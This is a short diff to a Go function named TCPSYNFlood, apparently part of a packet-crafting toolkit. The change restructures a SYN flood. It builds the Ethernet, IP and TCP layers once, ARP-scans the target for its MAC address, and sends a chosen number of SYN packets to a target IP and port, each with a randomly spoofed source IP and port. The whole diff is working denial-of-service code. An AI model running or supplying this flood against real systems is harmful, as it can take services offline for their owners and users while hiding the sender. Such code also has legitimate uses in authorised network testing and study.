@@ -9,23 +9,22 @@ import (
 
 func TCPSYNFlood(iface, targetIP, targetPort string, numberOfPackets int) {
 
+	ethLayer := packet.EthernetLayer()
+	ethLayer.SetEthernetType(golayers.EthernetTypeIPv4)
+	ethLayer.SetSrcMAC(utils.MacByInt(iface))
+	destinationMac, _ := ARPScanHost(iface, targetIP)
+	ethLayer.SetDstMAC(destinationMac)
+	ipLayer := packet.IPv4Layer()
+	ipLayer.SetDstIP(targetIP)
+	ipLayer.SetProtocol(golayers.IPProtocolTCP)
+	tcpLayer := packet.TCPLayer()
+	tcpLayer.SetDstPort(targetPort)
+	tcpLayer.SetSyn()
+
 	for i := 0; i < numberOfPackets; i++ {
-		ethLayer := packet.EthernetLayer()
-		ethLayer.SetEthernetType(golayers.EthernetTypeIPv4)
-		ethLayer.SetSrcMAC(utils.ParseMACGen())
-		ethLayer.SetDstMAC(utils.ParseMACGen())
-
-		ipLayer := packet.IPv4Layer()
 		ipLayer.SetSrcIP(utils.ParseIPGen())
-		ipLayer.SetDstIP(targetIP)
-		ipLayer.SetProtocol(golayers.IPProtocolTCP)
-
-		tcpLayer := packet.TCPLayer()
 		tcpLayer.SetSrcPort(utils.RandomPort())
-		tcpLayer.SetDstPort(targetPort)
-		tcpLayer.SetSyn()
 		tcpLayer.Layer().SetNetworkLayerForChecksum(ipLayer.Layer())
-
 		completePacket, _ := packet.CraftPacket(ethLayer.Layer(), ipLayer.Layer(), tcpLayer.Layer())
 		communication.Send(completePacket, iface)
 	}
